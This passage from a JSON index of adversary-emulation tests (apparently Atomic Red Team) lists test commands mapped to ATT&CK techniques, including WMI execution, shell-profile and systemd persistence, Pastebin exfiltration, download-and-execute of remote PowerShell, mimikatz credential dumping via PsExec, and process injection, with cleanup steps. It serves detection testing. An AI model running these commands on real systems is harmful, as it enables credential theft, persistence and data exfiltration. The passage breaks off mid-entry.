			"command": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\"))\n$NewClass = $Class.Derive(\"#{new_class}\")\n$NewClass.Put()\nInvoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}\n",
			"cleanup_command": "$CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"#{new_class}\"))\ntry { $CleanupClass.Delete() } catch {}\n"
		},
		"attack_technique": "T1047",
		"phases": ["execution"]
	},
	{
		"name": "WMI Execute rundll32",
		"auto_generated_guid": "00738d2a-4651-4d76-adf2-c43a41dfb243",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"node": {
				"description": "Ip Address",
				"type": "string",
				"default": "127.0.0.1"
			},
			"dll_to_execute": {
				"description": "Path to DLL.",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\calc.dll"
			},
			"function_to_execute": {
				"description": "Name of DLL function to call",
				"type": "string",
				"default": "StartW"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "DLL with function to execute must exist on disk at specified location (#{dll_to_execute})",
				"prereq_command": "if (Test-Path \"#{dll_to_execute}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true\" -OutFile \"#{dll_to_execute}\"\n"
			}
		],
		"executor": {
			"command": "wmic /node:#{node} process call create \"rundll32.exe \\\"#{dll_to_execute}\\\" #{function_to_execute}\"\n",
			"cleanup_command": "taskkill /f /im calculator.exe",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1047",
		"phases": ["execution"]
	},
	{
		"name": "Application uninstall using WMIC",
		"auto_generated_guid": "c510d25b-1667-467d-8331-a56d3e9bc4ff",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"node": {
				"description": "Computer the action is being executed against but defaults to the localhost.",
				"type": "string",
				"default": "127.0.0.1"
			},
			"product": {
				"description": "Enter the product name being uninstalled.  This will default to TightVNC.",
				"type": "string",
				"default": "Tightvnc"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "TightVNC must be installed.",
				"prereq_command": "if ((Test-Path \"C:\\Program Files\\TightVNC\\tvnviewer.exe\")-Or (Test-Path \"C:\\Program Files (x86)\\TightVNC\\tvnviewer.exe\")) {exit 0} else {exit 1}",
				"get_prereq_command": "Invoke-WebRequest 'https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi' -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\tightvncinstaller.msi\"\nstart-sleep -s 10\nmsiexec /i \"PathToAtomicsFolder\\..\\ExternalPayloads\\tightvncinstaller.msi\" /qn /norestart\nstart-sleep -s 15"
			}
		],
		"executor": {
			"command": "wmic /node:\"#{node}\" product where \"name like '#{product}%%'\" call uninstall",
			"cleanup_command": "msiexec /i \"PathToAtomicsFolder\\..\\ExternalPayloads\\tightvncinstaller.msi\" /qn /norestart",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1047",
		"phases": ["execution"]
	},
	{
		"name": "Add command to .bash_profile",
		"auto_generated_guid": "94500ae1-7e31-47e3-886b-c328da46872f",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"command_to_add": {
				"description": "Command to add to the .bash_profile file",
				"type": "string",
				"default": "echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004"
			}
		},
		"executor": {
			"command": "echo '#{command_to_add}' >> ~/.bash_profile\n",
			"cleanup_command": "head -n '-2' ~/.bash_profile > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.bash_profile\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1546.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Add command to .bashrc",
		"auto_generated_guid": "0a898315-4cfa-4007-bafe-33a4646d115f",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"command_to_add": {
				"description": "Command to add to the .bashrc file",
				"type": "string",
				"default": "echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004"
			}
		},
		"executor": {
			"command": "echo '#{command_to_add}' >> ~/.bashrc\n",
			"cleanup_command": "head -n '-2' ~/.bashrc > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.bashrc\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1546.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Add command to .shrc",
		"auto_generated_guid": "41502021-591a-4649-8b6e-83c9192aff53",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"command_to_add": {
				"description": "Command to add to the .shrc file",
				"type": "string",
				"default": "echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004"
			}
		},
		"executor": {
			"command": "echo '#{command_to_add}' >> ~/.shrc\n",
			"cleanup_command": "head -n '-2' ~/.shrc > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.shrc\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1546.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Append to the system shell profile",
		"auto_generated_guid": "694b3cc8-6a78-4d35-9e74-0123d009e94b",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"text_to_append": {
				"description": "Text to append to the /etc/profile file",
				"type": "string",
				"default": "# Hello from Atomic Red Team T1546.004"
			}
		},
		"executor": {
			"elevation_required": true,
			"name": "sh",
			"command": "echo '#{text_to_append}' >> /etc/profile\n",
			"cleanup_command": "sed -i \"s/# Atomic Red Team was here! T1546.004//\" /etc/profile\n"
		},
		"attack_technique": "T1546.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Append commands user shell profile",
		"auto_generated_guid": "bbdb06bc-bab6-4f5b-8232-ba3fbed51d77",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"text_to_append": {
				"description": "Text to append to the ~/.profile file",
				"type": "string",
				"default": "# Atomic Red Team was here... T1546.004"
			}
		},
		"executor": {
			"elevation_required": false,
			"name": "sh",
			"command": "echo '#{text_to_append}' >> ~/.profile\n",
			"cleanup_command": "sed -i \"s/# Atomic Red Team was here... T1546.004//\" ~/.profile\n"
		},
		"attack_technique": "T1546.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "System shell profile scripts",
		"auto_generated_guid": "8fe2ccfd-f079-4c03-b1a9-bd9b362b67d4",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"text_to_append": {
				"description": "Text to append to the /etc/profile.d/bash_completion.sh file",
				"type": "string",
				"default": "# Atomic Red Team was here... T1546.004"
			}
		},
		"executor": {
			"elevation_required": true,
			"name": "sh",
			"command": "echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh\n",
			"cleanup_command": "sed -i \"s/# Atomic Red Team was here... T1546.004//\" /etc/profile.d/bash_completion.sh\n"
		},
		"attack_technique": "T1546.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Create/Append to .bash_logout",
		"auto_generated_guid": "37ad2f24-7c53-4a50-92da-427a4ad13f58",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "useradd --create-home --shell /bin/bash art\nsu --login art\necho 'echo \"Atomic Red Team was here... T1546.004\" >> $HOME/art.txt' >> $HOME/.bash_logout\n",
			"cleanup_command": "userdel -fr art\n"
		},
		"attack_technique": "T1546.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)",
		"auto_generated_guid": "c2e8ab6e-431e-460a-a2aa-3bc6a32022e3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"api_key": {
				"description": "Pastebin API key",
				"type": "string",
				"default": "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0"
			}
		},
		"executor": {
			"command": "$apiKey = \"#{api_key}\"\n$content = \"secrets, api keys, passwords...\"\n$url = \"https://pastebin.com/api/api_post.php\"\n$postData = @{\n  api_dev_key   = $apiKey\n  api_option    = \"paste\"\n  api_paste_code = $content\n}\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\nWrite-Host \"Your paste URL: $response\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1567.003",
		"phases": ["exfiltration"]
	},
	{
		"name": "Modify SSH Authorized Keys",
		"auto_generated_guid": "342cc723-127c-4d3a-8292-9c0c6b4ecadc",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi;\n",
			"cleanup_command": "unset ssh_authorized_keys\n"
		},
		"attack_technique": "T1098.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Shellcode execution via VBA",
		"auto_generated_guid": "1c91e740-1729-4329-b779-feba6e71d048",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"txt_path": {
				"description": "Path to file containing VBA macro to run",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The 64-bit version of Microsoft Office must be installed\n",
				"prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\"\n"
			},
			{
				"description": "\"#{txt_path}\" must exist on disk at specified location\n",
				"prereq_command": "if (Test-Path \"#{txt_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{txt_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt\" -OutFile \"#{txt_path}\" -UseBasicParsing\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Remote Process Injection in LSASS via mimikatz",
		"auto_generated_guid": "3203ad24-168e-4bec-be36-f79b13ef8a83",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"machine": {
				"description": "machine to target (via psexec)",
				"type": "string",
				"default": "DC1"
			},
			"mimikatz_path": {
				"description": "Mimikatz windows executable",
				"type": "path",
				"default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
			},
			"psexec_path": {
				"description": "Path to PsExec",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
				"prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
			},
			{
				"description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
				"prereq_command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" -UseBasicParsing\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Section View Injection",
		"auto_generated_guid": "c6952f41-6cf0-450a-b352-2ca8dae7c178",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\"\n",
			"cleanup_command": "Stop-Process $notepad.pid",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Dirty Vanity process Injection",
		"auto_generated_guid": "49543237-25db-497b-90df-d0a0a6e8fe2c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"pid": {
				"description": "Parent process ID",
				"type": "string",
				"default": "(Start-Process calc.exe -PassThru).Id"
			}
		},
		"executor": {
			"command": "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid}\n",
			"cleanup_command": "Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Read-Write-Execute process Injection",
		"auto_generated_guid": "0128e48e-8c1a-433a-a11a-a5387384f1e1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vuln_dll": {
				"description": "vulnerable DLL",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\msys-2.0.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Utility to inject must exist on disk at specified location (#{vuln_dll})\n",
				"prereq_command": "if (Test-Path \"#{vuln_dll}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{vuln_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/vuln_dll/msys-2.0.dll\" -OutFile \"#{vuln_dll}\"\n"
			}
		],
		"executor": {
			"command": "$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\n& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"#{vuln_dll}\" $address\n",
			"cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Process Injection with Go using UuidFromStringA WinAPI",
		"auto_generated_guid": "2315ce15-38b6-46ac-a3eb-5e21abef2545",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\UuidFromStringA.exe -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Process Injection with Go using EtwpCreateEtwThread WinAPI",
		"auto_generated_guid": "7362ecef-6461-402e-8716-7410e1566400",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Remote Process Injection with Go using RtlCreateUserThread WinAPI",
		"auto_generated_guid": "a0c1725f-abcd-40d6-baac-020f3cf94ecd",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"spawn_process_path": {
				"description": "Path of the binary to spawn",
				"type": "string",
				"default": "C:\\Windows\\System32\\werfault.exe"
			},
			"spawn_process_name": {
				"description": "Name of the process spawned",
				"type": "string",
				"default": "werfault"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\RtlCreateUserThread.exe -pid $process.Id -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue\n"
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Remote Process Injection with Go using CreateRemoteThread WinAPI",
		"auto_generated_guid": "69534efc-d5f5-4550-89e6-12c6457b9edd",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"spawn_process_path": {
				"description": "Path of the binary to spawn",
				"type": "string",
				"default": "C:\\Windows\\System32\\werfault.exe"
			},
			"spawn_process_name": {
				"description": "Name of the process spawned",
				"type": "string",
				"default": "werfault"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue\n"
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively)",
		"auto_generated_guid": "2a4ab5c1-97ad-4d6d-b5d3-13f3a6c94e39",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"spawn_process_path": {
				"description": "Path of the binary to spawn",
				"type": "string",
				"default": "C:\\Windows\\System32\\werfault.exe"
			},
			"spawn_process_name": {
				"description": "Name of the process spawned",
				"type": "string",
				"default": "werfault"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue\n"
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Process Injection with Go using CreateThread WinAPI",
		"auto_generated_guid": "2871ed59-3837-4a52-9107-99500ebc87cb",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Process Injection with Go using CreateThread WinAPI (Natively)",
		"auto_generated_guid": "2a3c7035-d14f-467a-af94-933e49fe6786",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "UUID custom process Injection",
		"auto_generated_guid": "0128e48e-8c1a-433a-a11a-a5304734f1e1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"exe_binary": {
				"description": "PE binary",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1055\\bin\\x64\\uuid_injection.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Portable Executable to inject must exist at specified location (#{exe_binary})\n",
				"prereq_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/uuid_injection.exe\" -OutFile \"#{exe_binary}\"\n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
			"cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1055",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Execute a process from a directory masquerading as the current parent directory.",
		"auto_generated_guid": "812c3ab8-94b0-4698-a9bf-9420af23ce24",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"test_message": {
				"description": "Test message to echo out to the screen",
				"type": "string",
				"default": "Hello from the Atomic Red Team test T1036.005#1"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "mkdir $HOME/...\ncp $(which sh) $HOME/...\n$HOME/.../sh -c \"echo #{test_message}\"\n",
			"cleanup_command": "rm -f $HOME/.../sh\nrmdir $HOME/.../\n"
		},
		"attack_technique": "T1036.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Masquerade as a built-in system executable",
		"auto_generated_guid": "35eb8d16-9820-4423-a2a1-90c4f5edd9ca",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"executable_filepath": {
				"description": "File path where the generated executable will be dropped and executed from. The filename should be the name of a built-in system utility.",
				"type": "string",
				"default": "$Env:windir\\Temp\\svchost.exe"
			}
		},
		"executor": {
			"command": "Add-Type -TypeDefinition @'\npublic class Test {\n    public static void Main(string[] args) {\n        System.Console.WriteLine(\"tweet, tweet\");\n    }\n}\n'@ -OutputAssembly \"#{executable_filepath}\"\n\nStart-Process -FilePath \"#{executable_filepath}\"\n",
			"cleanup_command": "Remove-Item -Path \"#{executable_filepath}\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1036.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Enable Apple Remote Desktop Agent",
		"auto_generated_guid": "8a930abe-841c-4d4f-a877-72e9fe90b9ea",
		"supported_platforms": ["macos"],
		"executor": {
			"name": "sh",
			"command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet\n",
			"cleanup_command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop -configure -privs -none -quiet\n",
			"elevation_required": true
		},
		"attack_technique": "T1021.005",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Create Systemd Service",
		"auto_generated_guid": "d9e4f24f-aa67-4c6e-bcbf-85622b697a7c",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"systemd_service_path": {
				"description": "Path to systemd service unit file",
				"type": "path",
				"default": "/etc/systemd/system"
			},
			"systemd_service_file": {
				"description": "File name of systemd service unit file",
				"type": "string",
				"default": "art-systemd-service.service"
			},
			"execstoppost_action": {
				"description": "ExecStopPost action for Systemd service",
				"type": "string",
				"default": "/bin/touch /tmp/art-systemd-execstoppost-marker"
			},
			"execreload_action": {
				"description": "ExecReload action for Systemd service",
				"type": "string",
				"default": "/bin/touch /tmp/art-systemd-execreload-marker"
			},
			"execstart_action": {
				"description": "ExecStart action for Systemd service",
				"type": "string",
				"default": "/bin/touch /tmp/art-systemd-execstart-marker"
			},
			"execstop_action": {
				"description": "ExecStop action for Systemd service",
				"type": "string",
				"default": "/bin/touch /tmp/art-systemd-execstop-marker"
			},
			"execstartpre_action": {
				"description": "ExecStartPre action for Systemd service",
				"type": "string",
				"default": "/bin/touch /tmp/art-systemd-execstartpre-marker"
			},
			"execstartpost_action": {
				"description": "ExecStartPost action for Systemd service",
				"type": "string",
				"default": "/bin/touch /tmp/art-systemd-execstartpost-marker"
			}
		},
		"executor": {
			"command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n",
			"cleanup_command": "systemctl stop #{systemd_service_file}\nsystemctl disable #{systemd_service_file}\nrm -rf #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1543.002",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Create SysV Service",
		"auto_generated_guid": "760fe8d2-79d9-494f-905e-a239a3df86f6",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"rc_service_path": {
				"description": "Path to rc service file",
				"type": "path",
				"default": "/usr/local/etc/rc.d"
			},
			"rc_service_file": {
				"description": "File name of rc service file",
				"type": "string",
				"default": "art-test"
			}
		},
		"executor": {
			"command": "echo '#\\!/bin/sh' > #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho '#' >> #{rc_service_path}/#{rc_service_file}\necho '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file}\necho '# REQUIRE: LOGIN' >> #{rc_service_path}/#{rc_service_file}\necho '# KEYWORD: shutdown' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho 'name=\"art_test\"' >> #{rc_service_path}/#{rc_service_file}\necho 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file}\necho 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file}\necho 'command=\"/usr/bin/touch\"' >> #{rc_service_path}/#{rc_service_file}\necho 'start_cmd=\"art_test_start\"' >> #{rc_service_path}/#{rc_service_file}\necho '' >> #{rc_service_path}/#{rc_service_file}\necho 'art_test_start()' >> #{rc_service_path}/#{rc_service_file}     \necho '{' >> #{rc_service_path}/#{rc_service_file}\necho '  ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file}\necho '}' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}     \necho 'run_rc_command \"$1\"' >> #{rc_service_path}/#{rc_service_file}\nchmod +x #{rc_service_path}/#{rc_service_file}\nservice art-test enable\nservice art-test start\n",
			"cleanup_command": "sysrc -x art_test_enable\nrm -f #{rc_service_path}/#{rc_service_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1543.002",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Create Systemd Service file,  Enable the service , Modify and Reload the service.",
		"auto_generated_guid": "c35ac4a8-19de-43af-b9f8-755da7e89c89",
		"supported_platforms": ["linux"],
		"dependencies": [
			{
				"description": "System must be Ubuntu ,Kali OR CentOS.\n",
				"prereq_command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then exit /b 0; else exit /b 1; fi;\n",
